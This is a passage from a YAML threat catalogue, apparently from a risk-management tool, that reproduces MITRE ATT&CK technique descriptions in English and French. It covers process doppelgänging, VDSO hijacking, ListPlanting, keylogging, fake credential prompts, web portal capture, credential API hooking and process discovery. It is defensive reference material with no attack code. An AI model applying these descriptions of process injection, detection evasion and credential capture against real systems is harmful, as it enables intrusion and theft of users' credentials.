      \ context of the transaction.\n* Load \u2013 Create a shared section of memory\
      \ and load the malicious executable.\n* Rollback \u2013 Undo changes to original\
      \ executable, effectively removing malicious code from the file system.\n* Animate\
      \ \u2013 Create a process from the tainted section of memory and initiate execution.\n\
      \nThis behavior will likely not result in elevated privileges since the injected\
      \ process was spawned from (and thus inherits the security context) of the injecting\
      \ process. However, execution via process doppelg\xE4nging may evade detection\
      \ from security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/013"
    translations:
      fr:
        name: "Process Doppelg\xE4nging"
        description: "Les adversaires peuvent injecter du code malveillant dans le\
          \ processus via le double du processus afin d\u2019\xE9chapper aux d\xE9\
          fenses bas\xE9es sur le processus et \xE9ventuellement d\u2019\xE9lever\
          \ des privil\xE8ges. Le double de processus est une m\xE9thode d\u2019ex\xE9\
          cution de code arbitraire dans l\u2019espace d\u2019adressage d\u2019un\
          \ processus en direct s\xE9par\xE9. \n\nLe NTFS transactionnel de Windows\
          \ (TxF) a \xE9t\xE9 introduit dans Vista comme m\xE9thode pour effectuer\
          \ des op\xE9rations de fichiers s\xE9curis\xE9es. (Citation : Microsoft\
          \ TxF) Pour garantir l\u2019int\xE9grit\xE9 des donn\xE9es, TxF ne permet\
          \ qu\u2019un seul handle transactionn\xE9 d\u2019\xE9crire dans un fichier\
          \ \xE0 la fois. Jusqu\u2019\xE0 ce que la transaction d\u2019\xE9criture\
          \ du handle soit termin\xE9e, tous les autres handles sont isol\xE9s de\
          \ l\u2019auteur et ne peuvent lire que la version confirm\xE9e du fichier\
          \ existant au moment de l\u2019ouverture. (Citation : Microsoft Basic TxF\
          \ Concepts) Pour \xE9viter la corruption, TxF effectue un retour en arri\xE8\
          re automatique si le syst\xE8me ou l\u2019application \xE9choue lors d\u2019\
          une transaction d\u2019\xE9criture. (Citation : O\xF9 utiliser TxF)\n\n\
          Bien que d\xE9pr\xE9ci\xE9e, l\u2019interface de programmation d\u2019applications\
          \ (API) TxF est toujours activ\xE9e \xE0 partir de Windows 10. (Citation\
          \ : Double du processus BlackHat d\xE9c. 2017)\n\nLes adversaires peuvent\
          \ abuser de TxF pour effectuer une variation sans fichier de [Process Injection](https://attack.mitre.org/techniques/T1055).\
          \ Similaire au [Process Hollowing](https://attack.mitre.org/techniques/T1055/012),\
          \ le doppelg\xE4nging consiste \xE0 remplacer la m\xE9moire d\u2019un processus\
          \ l\xE9gitime, permettant l\u2019ex\xE9cution voil\xE9e de code malveillant\
          \ pouvant \xE9chapper aux d\xE9fenses et \xE0 la d\xE9tection. L\u2019utilisation\
          \ de TxF par le doppelg\xE4nging permet \xE9galement d\u2019\xE9viter l\u2019\
          utilisation de fonctions API tr\xE8s surveill\xE9es telles que <code>NtUnmapViewOfSection</code>,\
          \ <code>VirtualProtectEx</code> et <code>SetThreadContext</code>. (Citation\
          \ : Double du processus BlackHat d\xE9c. 2017)\n\nLe double des processus\
          \ est mis en \u0153uvre en 4 \xE9tapes (Citation : BlackHat Process Doppelg\xE4\
          nging d\xE9c. 2017) :\n\n* Transacter \u2013 Cr\xE9er une transaction TxF\
          \ \xE0 l\u2019aide d\u2019un ex\xE9cutable l\xE9gitime puis \xE9craser le\
          \ fichier avec un code malveillant. Ces changements seront isol\xE9s et\
          \ visibles uniquement dans le contexte de la transaction.\n* Charger \u2013\
          \ Cr\xE9er une section de m\xE9moire partag\xE9e et charger l\u2019ex\xE9\
          cutable malveillant.\n* Retour en arri\xE8re \u2013 Annuler les modifications\
          \ de l\u2019ex\xE9cutable original, supprimant ainsi effectivement le code\
          \ malveillant du syst\xE8me de fichiers.\n* Animer \u2013 Cr\xE9er un processus\
          \ \xE0 partir de la section corrompue de la m\xE9moire et lancer l\u2019\
          ex\xE9cution.\n\nCe comportement ne conduira probablement pas \xE0 des privil\xE8\
          ges \xE9lev\xE9s puisque le processus inject\xE9 provient (et h\xE9rite\
          \ donc du contexte de s\xE9curit\xE9) du processus injecteur. Cependant,\
          \ l\u2019ex\xE9cution via le doppelg\xE4nging des processus peut \xE9chapper\
          \ \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque l\u2019ex\xE9\
          cution est masqu\xE9e sous un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/013"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.014
    ref_id: T1055.014
    name: VDSO Hijacking
    description: "Adversaries may inject malicious code into processes via VDSO hijacking\
      \ in order to evade process-based defenses as well as possibly elevate privileges.\
      \ Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary\
      \ code in the address space of a separate live process. \n\nVDSO hijacking involves\
      \ redirecting calls to dynamically linked shared libraries. Memory protections\
      \ may prevent writing executable code to a process via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008).\
      \ However, an adversary may hijack the syscall interface code stubs mapped into\
      \ a process from the vdso shared object to execute syscalls to open and map\
      \ a malicious shared object. This code can then be invoked by redirecting the\
      \ execution flow of the process via patched memory address references stored\
      \ in a process' global offset table (which store absolute addresses of mapped\
      \ library functions).(Citation: ELF Injection May 2009)(Citation: Backtrace\
      \ VDSO)(Citation: VDSO Aug 2005)(Citation: Syscall 2014)\n\nRunning code in\
      \ the context of another process may allow access to the process's memory, system/network\
      \ resources, and possibly elevated privileges. Execution via VDSO hijacking\
      \ may also evade detection from security products since the execution is masked\
      \ under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/014"
    translations:
      fr:
        name: "D\xE9tournement du VDSO"
        description: "Les adversaires peuvent injecter du code malveillant dans les\
          \ processus via le d\xE9tournement VDSO afin d\u2019\xE9chapper aux d\xE9\
          fenses bas\xE9es sur les processus et \xE9ventuellement d\u2019augmenter\
          \ leurs privil\xE8ges. Le d\xE9tournement d\u2019objets partag\xE9s dynamiques\
          \ virtuels (vdso) est une m\xE9thode d\u2019ex\xE9cution de code arbitraire\
          \ dans l\u2019espace d\u2019adressage d\u2019un processus en direct s\xE9\
          par\xE9. \n\nLe d\xE9tournement VDSO consiste \xE0 rediriger les appels\
          \ vers des biblioth\xE8ques partag\xE9es dynamiquement li\xE9es. Les protections\
          \ m\xE9moire peuvent emp\xEAcher l\u2019\xE9criture de code ex\xE9cutable\
          \ sur un processus via [Ptrace System Calls](https://attack.mitre.org/techniques/T1055/008).\
          \ Cependant, un adversaire peut d\xE9tourner les stubs de code de l\u2019\
          interface syscall mapp\xE9s dans un processus depuis l\u2019objet partag\xE9\
          \ vdso pour ex\xE9cuter des syscalls afin d\u2019ouvrir et de mapper un\
          \ objet partag\xE9 malveillant. Ce code peut ensuite \xEAtre invoqu\xE9\
          \ en redirigeant le flux d\u2019ex\xE9cution du processus via des r\xE9\
          f\xE9rences d\u2019adresses m\xE9moire patch\xE9es stock\xE9es dans une\
          \ table globale de d\xE9calage du processus (qui stockent les adresses absolues\
          \ des fonctions de biblioth\xE8que mapp\xE9es). (Citation : Injection ELF\
          \ mai 2009)(Citation : Backtrace VDSO)(Citation : VDSO ao\xFBt 2005)(Citation\
          \ : Syscall 2014)\n\nL\u2019ex\xE9cution du code dans le contexte d\u2019\
          un autre processus peut permettre d\u2019acc\xE9der \xE0 la m\xE9moire du\
          \ processus, aux ressources syst\xE8me/r\xE9seau, et \xE9ventuellement \xE0\
          \ des privil\xE8ges \xE9lev\xE9s. L\u2019ex\xE9cution via le d\xE9tournement\
          \ VDSO peut \xE9galement \xE9chapper \xE0 la d\xE9tection des produits de\
          \ s\xE9curit\xE9 puisque l\u2019ex\xE9cution est masqu\xE9e par un processus\
          \ l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/014"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.015
    ref_id: T1055.015
    name: ListPlanting
    description: "Adversaries may abuse list-view controls to inject malicious code\
      \ into hijacked processes in order to evade process-based defenses as well as\
      \ possibly elevate privileges. ListPlanting is a method of executing arbitrary\
      \ code in the address space of a separate live process.(Citation: Hexacorn Listplanting)\
      \ Code executed via ListPlanting may also evade detection from security products\
      \ since the execution is masked under a legitimate process.\n\nList-view controls\
      \ are user interface windows used to display collections of items.(Citation:\
      \ Microsoft List View Controls) Information about an application's list-view\
      \ settings are stored within the process' memory in a <code>SysListView32</code>\
      \ control.\n\nListPlanting (a form of message-passing \"shatter attack\") may\
      \ be performed by copying code into the virtual address space of a process that\
      \ uses a list-view control then using that code as a custom callback for sorting\
      \ the listed items.(Citation: Modexp Windows Process Injection) Adversaries\
      \ must first copy code into the target process\u2019 memory space, which can\
      \ be performed various ways including by directly obtaining a handle to the\
      \ <code>SysListView32</code> child of the victim process window (via Windows\
      \ API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>)\
      \ or other [Process Injection](https://attack.mitre.org/techniques/T1055) methods.\n\
      \nSome variations of ListPlanting may allocate memory in the target process\
      \ but then use window messages to copy the payload, to avoid the use of the\
      \ highly monitored <code>WriteProcessMemory</code> function. For example, an\
      \ adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code>\
      \ API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code>\
      \ messages, effectively copying a payload 2 bytes at a time to the allocated\
      \ memory.(Citation: ESET InvisiMole June 2020) \n\nFinally, the payload is triggered\
      \ by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code>\
      \ child of the process window, with the payload within the newly allocated buffer\
      \ passed and executed as the <code>ListView_SortItems</code> callback.\nhttps://attack.mitre.org/techniques/T1055/015"
    translations:
      fr:
        name: Plantation par liste
        description: "Les adversaires peuvent abuser des contr\xF4les en vue de liste\
          \ pour injecter du code malveillant dans des processus d\xE9tourn\xE9s afin\
          \ d\u2019\xE9chapper aux d\xE9fenses bas\xE9es sur les processus et \xE9\
          ventuellement d\u2019augmenter les privil\xE8ges. Le ListPlanting est une\
          \ m\xE9thode d\u2019ex\xE9cution de code arbitraire dans l\u2019espace d\u2019\
          adressage d\u2019un processus en direct s\xE9par\xE9. (Citation : Plantation\
          \ d\u2019hexacornes) Le code ex\xE9cut\xE9 via ListPlanting peut \xE9galement\
          \ \xE9chapper \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque\
          \ l\u2019ex\xE9cution est masqu\xE9e par un processus l\xE9gitime.\n\nLes\
          \ contr\xF4les en vue liste sont des fen\xEAtres d\u2019interface utilisateur\
          \ utilis\xE9es pour afficher des collections d\u2019\xE9l\xE9ments. (Citation\
          \ : Contr\xF4les Microsoft List View) Les informations sur les param\xE8\
          tres de vue de liste d\u2019une application sont stock\xE9es dans la m\xE9\
          moire du processus dans un contr\xF4le <code>SysListView32</code>.\n\nLe\
          \ ListPlanting (une forme d\u2019attaque \xAB shatter attack \xBB) par passage\
          \ de messages) peut \xEAtre r\xE9alis\xE9 en copiant du code dans l\u2019\
          espace d\u2019adressage virtuel d\u2019un processus utilisant un contr\xF4\
          le en vue liste, puis en utilisant ce code comme un rappel personnalis\xE9\
          \ pour trier les \xE9l\xE9ments list\xE9s. (Citation : Injection de processus\
          \ Windows Modexp) Les adversaires doivent d\u2019abord copier le code dans\
          \ l\u2019espace m\xE9moire du processus cible, ce qui peut \xEAtre r\xE9\
          alis\xE9 de diff\xE9rentes mani\xE8res, notamment en obtenant directement\
          \ un handle sur l\u2019enfant <code>SysListView32</code> de la fen\xEAtre\
          \ de processus victime (via des appels API Windows tels que <code>FindWindow</code>\
          \ et/<code>ou EnumWindows</code>) ou d\u2019autres m\xE9thodes [Process\
          \ Injection](https://attack.mitre.org/techniques/T1055).\n\nCertaines variantes\
          \ de ListPlanting peuvent allouer de la m\xE9moire dans le processus cible\
          \ mais utiliser ensuite des messages fen\xEAtres pour copier la charge utile,\
          \ afin d\u2019\xE9viter l\u2019utilisation de la fonction <code>tr\xE8s\
          \ surveill\xE9e WriteProcessMemory</code>. Par exemple, un adversaire peut\
          \ utiliser les fonctions <code>PostMessage</code> et/ou <code>SendMessage</code>\
          \ API pour envoyer <code>LVM_SETITEMPOSITION</code> et <code>LVM_GETITEMPOSITION</code>\
          \ messages, copiant ainsi une charge utile 2 octets \xE0 la fois dans la\
          \ m\xE9moire allou\xE9e. (Citation : ESET InvisiMole juin 2020) \n\nEnfin,\
          \ la charge utile est d\xE9clench\xE9e en envoyant le message <code>LVM_SORTITEMS</code>\
          \ \xE0 <code>l\u2019enfant SysListView32</code> de la fen\xEAtre de processus,\
          \ la charge utile dans le tampon nouvellement allou\xE9 \xE9tant pass\xE9\
          e et ex\xE9cut\xE9e comme le <code>rappel ListView_SortItems</code>.\nhttps://attack.mitre.org/techniques/T1055/015"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056
    ref_id: T1056
    name: Input Capture
    description: Adversaries may use methods of capturing user input to obtain credentials
      or collect information. During normal system usage, users often provide credentials
      to various different locations, such as login pages/portals or system dialog
      boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential
      API Hooking](https://attack.mitre.org/techniques/T1056/004)) or rely on deceiving
      the user into providing input into what they believe to be a genuine service
      (e.g. [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003)).
    translations:
      fr:
        name: "Capture d\u2019entr\xE9e"
        description: "Les adversaires peuvent utiliser des m\xE9thodes de capture\
          \ des informations des utilisateurs pour obtenir des identifiants ou collecter\
          \ des informations. Lors de l\u2019utilisation normale du syst\xE8me, les\
          \ utilisateurs fournissent souvent des identifiants \xE0 diff\xE9rents endroits,\
          \ tels que des pages/portails de connexion ou des bo\xEEtes de dialogue\
          \ syst\xE8me. Les m\xE9canismes de capture des entr\xE9es peuvent \xEAtre\
          \ transparents pour l\u2019utilisateur (par exemple [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004))\
          \ ou reposer sur la tromperie de l\u2019utilisateur pour qu\u2019il fournisse\
          \ une entr\xE9e dans ce qu\u2019il consid\xE8re comme un service authentique\
          \ (par exemple [Web Portal Capture](https://attack.mitre.org/techniques/T1056/003))."
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.001
    ref_id: T1056.001
    name: Keylogging
    description: 'Adversaries may log user keystrokes to intercept credentials as
      the user types them. Keylogging is likely to be used to acquire credentials
      for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)
      efforts are not effective, and may require an adversary to intercept keystrokes
      on a system for a substantial period of time before credentials can be successfully
      captured. In order to increase the likelihood of capturing credentials quickly,
      an adversary may also perform actions such as clearing browser cookies to force
      users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)


      Keylogging is the most prevalent type of input capture, with many different
      ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods
      include:


      * Hooking API callbacks used for processing keystrokes. Unlike [Credential API
      Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely
      on API functions intended for processing keystroke data.

      * Reading raw keystroke data from the hardware buffer.

      * Windows Registry modifications.

      * Custom drivers.

      * [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide
      adversaries with hooks into the operating system of network devices to read
      raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks)

      https://attack.mitre.org/techniques/T1056/001'
    translations:
      fr:
        name: Journal des touches
        description: "Les adversaires peuvent enregistrer les frappes de l\u2019utilisateur\
          \ pour intercepter les identifiants au fur et \xE0 mesure que l\u2019utilisateur\
          \ les tape. Le keylogging est susceptible d\u2019\xEAtre utilis\xE9 pour\
          \ acqu\xE9rir des identifiants pour de nouvelles opportunit\xE9s d\u2019\
          acc\xE8s lorsque les efforts de [OS Credential Dumping](https://attack.mitre.org/techniques/T1003)\
          \ ne sont pas efficaces, et peuvent n\xE9cessiter qu\u2019un adversaire\
          \ intercepte les frappes sur un syst\xE8me pendant une p\xE9riode importante\
          \ avant que les identifiants puissent \xEAtre captur\xE9s avec succ\xE8\
          s. Afin d\u2019augmenter la probabilit\xE9 de capturer rapidement les identifiants,\
          \ un adversaire peut \xE9galement effectuer des actions telles que l\u2019\
          effacer des cookies du navigateur pour forcer les utilisateurs \xE0 se r\xE9\
          authentifier sur les syst\xE8mes. (Citation : Talos Kimsuky nov. 2021)\n\
          \nLe keylogging est le type de capture d\u2019entr\xE9e le plus r\xE9pandu,\
          \ avec de nombreuses fa\xE7ons diff\xE9rentes d\u2019intercepter les frappes\
          \ au clavier. (Citation : Les aventures d\u2019une frappe clavier) Quelques\
          \ m\xE9thodes incluent :\n\n* Accrocher les callbacks API utilis\xE9s pour\
          \ traiter les frappes au clavier. Contrairement \xE0 [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004),\
          \ celui-ci se concentre uniquement sur les fonctions API destin\xE9es au\
          \ traitement des donn\xE9es de frappes clavier.\n* Lecture brute des donn\xE9\
          es de frappes du tampon mat\xE9riel.\n* Modifications du registre Windows.\n\
          * Pilotes personnalis\xE9s.\n* [Modifier l\u2019image syst\xE8me](https://attack.mitre.org/techniques/T1601)\
          \ peut fournir aux adversaires des accroches au syst\xE8me d\u2019exploitation\
          \ des dispositifs r\xE9seau pour lire les frappes brutes lors des sessions\
          \ de connexion. (Citation : Attaques d\u2019appareils h\xE9rit\xE9s du blog\
          \ Cisco)\nhttps://attack.mitre.org/techniques/T1056/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.002
    ref_id: T1056.002
    name: GUI Input Capture
    description: 'Adversaries may mimic common operating system GUI components to
      prompt users for credentials with a seemingly legitimate prompt. When programs
      are executed that need additional privileges than are present in the current
      user context, it is common for the operating system to prompt the user for proper
      credentials to authorize the elevated privileges for the task (ex: [Bypass User
      Account Control](https://attack.mitre.org/techniques/T1548/002)).


      Adversaries may mimic this functionality to prompt users for credentials with
      a seemingly legitimate prompt for a number of reasons that mimic normal usage,
      such as a fake installer requiring additional access or a fake malware removal
      suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be
      used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation:
      LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing
      credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation:
      LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan
      2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may
      launch dialog boxes prompting users for credentials from malicious shell scripts
      or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation:
      Spoofing credential dialogs)


      Adversaries may also mimic common software authentication requests, such as
      those from browsers or email clients. This may also be paired with user activity
      monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217)
      and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010))
      to spoof prompts when users are naturally accessing sensitive sites/data.

      https://attack.mitre.org/techniques/T1056/002'
    translations:
      fr:
        name: "Capture d\u2019entr\xE9e GUI"
        description: "Les adversaires peuvent imiter des composants GUI courants des\
          \ syst\xE8mes d\u2019exploitation pour solliciter les utilisateurs vers\
          \ des identifiants avec une invite apparemment l\xE9gitime. Lorsque des\
          \ programmes sont ex\xE9cut\xE9s n\xE9cessitant des privil\xE8ges suppl\xE9\
          mentaires par rapport au contexte utilisateur actuel, il est courant que\
          \ le syst\xE8me d\u2019exploitation demande \xE0 l\u2019utilisateur les\
          \ identifiants appropri\xE9s pour autoriser les privil\xE8ges \xE9lev\xE9\
          s de la t\xE2che (ex : [Contourner le contr\xF4le du compte utilisateur](https://attack.mitre.org/techniques/T1548/002)).\n\
          \nLes adversaires peuvent imiter cette fonctionnalit\xE9 pour demander aux\
          \ utilisateurs des identifiants avec une invite apparemment l\xE9gitime,\
          \ pour plusieurs raisons qui imitent une utilisation normale, comme un faux\
          \ installateur n\xE9cessitant un acc\xE8s suppl\xE9mentaire ou une suite\
          \ de suppression de malwares factice. (Citation : Le malware OSX exploite\
          \ MacKeeper) Ce type d\u2019invite peut \xEAtre utilis\xE9 pour collecter\
          \ des identifiants via divers langages tels que [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation\
          \ : LogRhythm Do You Trust oct. 2014)(Citation : OSX Keydnap malware)(Citation\
          \ : Usurpation de dialogues d\u2019identifiants) et [PowerShell](https://attack.mitre.org/techniques/T1059/001).\
          \ (Citation : LogRhythm Do You Trust oct. 2014)(Citation : Phishing Enigma\
          \ pour obtenir des accr\xE9ditations janvier 2015)(Citation : Usurpation\
          \ des dialogues de titres) Sur des syst\xE8mes Linux, les adversaires peuvent\
          \ lancer des bo\xEEtes de dialogue demandant aux utilisateurs des identifiants\
          \ via des scripts shell malveillants ou la ligne de commande (c\u2019est-\xE0\
          -dire [Unix Shell](https://attack.mitre.org/techniques/T1059/004)). (Citation\
          \ : Usurpation des dialogues de titres)\n\nLes adversaires peuvent \xE9\
          galement imiter des demandes d\u2019authentification logicielles courantes,\
          \ telles que celles provenant des navigateurs ou des clients de messagerie.\
          \ Cela peut \xE9galement \xEAtre associ\xE9 \xE0 la surveillance de l\u2019\
          activit\xE9 utilisateur (c\u2019est-\xE0-dire [D\xE9couverte d\u2019informations\
          \ du navigateur](https://attack.mitre.org/techniques/T1217) et/ou [D\xE9\
          couverte de fen\xEAtre d\u2019application](https://attack.mitre.org/techniques/T1010))\
          \ pour usurper les invites lorsque les utilisateurs acc\xE8dent naturellement\
          \ \xE0 des sites/donn\xE9es sensibles.\nhttps://attack.mitre.org/techniques/T1056/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.003
    ref_id: T1056.003
    name: Web Portal Capture
    description: 'Adversaries may install code on externally facing portals, such
      as a VPN login page, to capture and transmit credentials of users who attempt
      to log into the service. For example, a compromised login page may log provided
      user credentials before logging the user in to the service.


      This variation on input capture may be conducted post-compromise using legitimate
      administrative access as a backup measure to maintain network access through
      [External Remote Services](https://attack.mitre.org/techniques/T1133) and [Valid
      Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial
      compromise by exploitation of the externally facing web service.(Citation: Volexity
      Virtual Private Keylogging)

      https://attack.mitre.org/techniques/T1056/003'
    translations:
      fr:
        name: Capture du portail web
        description: "Les adversaires peuvent installer du code sur des portails orient\xE9\
          s vers l\u2019ext\xE9rieur, tels qu\u2019une page de connexion VPN, afin\
          \ de capturer et transmettre les identifiants des utilisateurs qui tentent\
          \ de se connecter au service. Par exemple, une page de connexion compromise\
          \ peut enregistrer les identifiants fournis avant de se connecter au service.\n\
          \nCette variation de la capture d\u2019entr\xE9e peut \xEAtre effectu\xE9\
          e apr\xE8s un compromis en utilisant un acc\xE8s administratif l\xE9gitime\
          \ comme mesure de secours pour maintenir l\u2019acc\xE8s r\xE9seau via [Services\
          \ externes \xE0 distance](https://attack.mitre.org/techniques/T1133) et\
          \ [Comptes valides](https://attack.mitre.org/techniques/T1078) ou dans le\
          \ cadre de la compromission initiale par exploitation du service web externe.\
          \ (Citation : Keylogging priv\xE9 virtuel Volexity)\nhttps://attack.mitre.org/techniques/T1056/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1056.004
    ref_id: T1056.004
    name: Credential API Hooking
    description: "Adversaries may hook into Windows application programming interface\
      \ (API) functions and Linux system functions to collect user credentials. Malicious\
      \ hooking mechanisms may capture API or function calls that include parameters\
      \ that reveal user authentication credentials.(Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I\
      \ Sept 2017) Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),\
      \ this technique focuses specifically on API functions that include parameters\
      \ that reveal user credentials. \n\nIn Windows, hooking involves redirecting\
      \ calls to these functions and can be implemented via:\n\n* **Hooks procedures**,\
      \ which intercept and execute designated code in response to events such as\
      \ messages, keystrokes, and mouse inputs.(Citation: Microsoft Hook Overview)(Citation:\
      \ Elastic Process Injection July 2017)\n* **Import address table (IAT) hooking**,\
      \ which use modifications to a process\u2019s IAT, where pointers to imported\
      \ API functions are stored.(Citation: Elastic Process Injection July 2017)(Citation:\
      \ Adlice Software IAT Hooks Oct 2014)(Citation: MWRInfoSecurity Dynamic Hooking\
      \ 2015)\n* **Inline hooking**, which overwrites the first bytes in an API function\
      \ to redirect code flow.(Citation: Elastic Process Injection July 2017)(Citation:\
      \ HighTech Bridge Inline Hooking Sept 2011)(Citation: MWRInfoSecurity Dynamic\
      \ Hooking 2015)\n\nIn Linux and macOS, adversaries may hook into system functions\
      \ via the `LD_PRELOAD` (Linux) or `DYLD_INSERT_LIBRARIES` (macOS) environment\
      \ variables, which enables loading shared libraries into a program\u2019s address\
      \ space. For example, an adversary may capture credentials by hooking into the\
      \ `libc read` function leveraged by SSH or SCP.(Citation: Intezer Symbiote 2022)\n\
      https://attack.mitre.org/techniques/T1056/004"
    translations:
      fr:
        name: "Accrochage API de cr\xE9dentials"
        description: "Les adversaires peuvent s\u2019accrocher aux fonctions de l\u2019\
          interface de programmation d\u2019applications Windows (API) et aux fonctions\
          \ syst\xE8me Linux pour collecter les identifiants utilisateur. Les m\xE9\
          canismes de hooking malveillants peuvent capturer des appels d\u2019API\
          \ ou de fonctions incluant des param\xE8tres r\xE9v\xE9lant les identifiants\
          \ d\u2019authentification utilisateur. (Citation : Microsoft TrojanSpy\_\
          :Win32/Ursnif.gen ! I septembre 2017) Contrairement au [keylogging](https://attack.mitre.org/techniques/T1056/001),\
          \ cette technique se concentre sp\xE9cifiquement sur les fonctions API qui\
          \ incluent des param\xE8tres r\xE9v\xE9lant les identifiants utilisateur.\
          \ \n\nSous Windows, le hooking consiste \xE0 rediriger les appels vers ces\
          \ fonctions et peut \xEAtre impl\xE9ment\xE9 via :\n\n* **Proc\xE9dures\
          \ de crochet**, qui interceptent et ex\xE9cutent du code d\xE9sign\xE9 en\
          \ r\xE9ponse \xE0 des \xE9v\xE9nements tels que des messages, des frappes\
          \ clavier et des entr\xE9es de souris. (Citation : Aper\xE7u du Microsoft\
          \ Hook)(Citation : Injection de proc\xE9d\xE9 \xE9lastique juillet 2017)\n\
          * **Importation de table d\u2019adresses (IAT)**, qui utilise des modifications\
          \ de l\u2019IAT d\u2019un processus, o\xF9 sont stock\xE9s les pointeurs\
          \ vers des fonctions API import\xE9es. (Citation : Injection de proc\xE9\
          d\xE9 \xE9lastique juillet 2017)(Citation : Adlice Software IAT Hooks oct.\
          \ 2014)(Citation : MWRInfoSecurity Dynamic Hooking 2015)\n* **Hooking en\
          \ ligne**, qui \xE9crase les premiers octets d\u2019une fonction API pour\
          \ rediriger le flux de code. (Citation : Injection de proc\xE9d\xE9 \xE9\
          lastique juillet 2017)(Citation : HighTech Bridge Inline Hooking sept. 2011)(Citation\
          \ : MWRInfoSecurity Dynamic Hooking 2015)\n\nDans Linux et macOS, les adversaires\
          \ peuvent s\u2019acc\xE9der aux fonctions syst\xE8me via les variables d\u2019\
          environnement \xAB LD_PRELOAD \xBB (Linux) ou \xAB DYLD_INSERT_LIBRARIES\
          \ \xBB (macOS), ce qui permet de charger des biblioth\xE8ques partag\xE9\
          es dans l\u2019espace d\u2019adressage d\u2019un programme. Par exemple,\
          \ un adversaire peut capturer des identifiants en se connectant \xE0 la\
          \ fonction \xAB libc read \xBB exploit\xE9e par SSH ou SCP. (Citation :\
          \ Intezer Symbiote 2022)\nhttps://attack.mitre.org/techniques/T1056/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1057
    ref_id: T1057
    name: Process Discovery
    description: 'Adversaries may attempt to get information about running processes
      on a system. Information obtained could be used to gain an understanding of
      common software/applications running on systems within the network. Administrator
      or otherwise elevated access may provide better process details. Adversaries
      may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057)
      during automated discovery to shape follow-on behaviors, including whether or
      not the adversary fully infects the target and/or attempts specific actions.


      In Windows environments, adversaries could obtain details on running processes
      using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106)
      or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001).
      Information about processes can also be extracted from the output of [Native
      API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>.
      In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries
      may also opt to enumerate processes via `/proc`. ESXi also supports use of the
      `ps` command, as well as `esxcli system process list`.(Citation: Sygnia ESXi
      Ransomware 2025)(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)


      On network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)
      commands such as `show processes` can be used to display current running processes.(Citation:
      US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)'
    translations:
      fr:
        name: "D\xE9couverte du processus"
        description: "Les adversaires peuvent tenter d\u2019obtenir des informations\
          \ sur les processus en cours d\u2019ex\xE9cution sur un syst\xE8me. Les\
          \ informations obtenues pourraient \xEAtre utilis\xE9es pour comprendre\
          \ les logiciels/applications courants fonctionnant sur les syst\xE8mes du\
          \ r\xE9seau. Un acc\xE8s administrateur ou autrement \xE9lev\xE9 peut fournir\
          \ de meilleurs d\xE9tails sur les proc\xE9dures. Les adversaires peuvent\
          \ utiliser les informations de [Process Discovery](https://attack.mitre.org/techniques/T1057)\
          \ lors de la d\xE9couverte automatis\xE9e pour fa\xE7onner les comportements\
          \ suivants, y compris si l\u2019adversaire infecte compl\xE8tement la cible\
          \ et/ou tente des actions sp\xE9cifiques.\n\nDans les environnements Windows,\
          \ les adversaires pouvaient obtenir des d\xE9tails sur l\u2019ex\xE9cution\
          \ des processus en utilisant l\u2019utilitaire [Tasklist](https://attack.mitre.org/software/S0057)\
          \ via [cmd](https://attack.mitre.org/software/S0106) ou <code>Get-Process</code>\
          \ via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Les informations\
          \ sur les processus peuvent \xE9galement \xEAtre extraites de la sortie\
          \ des appels [Native API](https://attack.mitre.org/techniques/T1106) tels\
          \ que <code>CreateToolhelp32Snapshot</code>. Sur Mac et Linux, cela se fait\
          \ avec la commande <code>ps</code>. Les adversaires peuvent \xE9galement\
